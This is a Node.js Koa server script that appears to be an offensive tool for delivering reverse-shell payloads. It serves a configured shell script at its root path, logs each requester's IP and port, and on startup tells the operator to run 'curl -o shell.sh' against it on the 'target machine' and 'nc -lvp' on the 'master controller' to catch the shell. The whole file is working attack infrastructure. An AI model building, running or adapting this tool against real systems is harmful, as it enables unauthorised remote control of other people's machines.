#!/usr/bin/env node

const path = require("path")
const fs = require("fs")
const Koa = require("koa")
const Router = require("koa-router")
const colors = require("colors")
const exit = require("process").exit
const {
    program,
    options,
    args
} = require("./components/argv-handler")

const isPortOccupied = require("./components/util").isPortOccupied


const app = new Koa()

if (options.help) program.outputHelp()
else {
    // static dir
    if (options.static && typeof options.static === "string") {
        const staticServer = require("koa-static")
        const staticDir = path.resolve(".", options.static)
        app.use(staticServer(staticDir))
    }



    // routes
    const router_index = new Router()
    // any (log)
    router_index.get(/^\/.*$/, (ctx, next) => {
        if (/\.(html|htm|php|jsp|asp)$/i.test(ctx.url) || !ctx.url.includes("."))
            console.info(
                "[INFO] ".cyan +
                ctx.method.green +
                ` ${ctx.url} `.yellow +
                "FROM ".cyan +
                `${ctx.socket.remoteAddress.replace(/::ffff:/, "")}/${ctx.socket.remotePort}`.yellow
            )
        next()
    })
    // index
    router_index.get("/", (ctx, next) => {
        ctx.type = options.contentType
        ctx.body = options.fileContent
    })

    // apply routes
    app.use(router_index.routes()).use(router_index.allowedMethods())


    // detect the port
    isPortOccupied(parseInt(options.serverPort)).then(occupied => {
        if (occupied) console.error("Port is occupied: " + options.serverPort), exit(1)
        else throw 'ok'
    }).catch(() => {
        // start the server
        app.listen(parseInt(options.serverPort), function () {
            console.info(
                [
                    `Server is running at port `.green + `${options.serverPort}`.yellow + `...\n`.green,
                    `- ` + `Try `.green +
                    `curl -o shell.sh ${options.serverHost}:${options.serverPort}`.cyan.underline +
                    ` on the `.green + `target machine`.yellow + `.`.green,
                    `- ` + `Try `.green +
                    `nc -lvp ${options.shellPort}`.cyan.underline +
                    ` on the `.green + `master controller`.yellow + ` (`.green + `${options.shellHost}`.cyan + `).\n`.green,
                    `DO NOT forget to quit this process!!!\n`.red
                ].join("\n")
            )
        })
    })
}

module.exports = app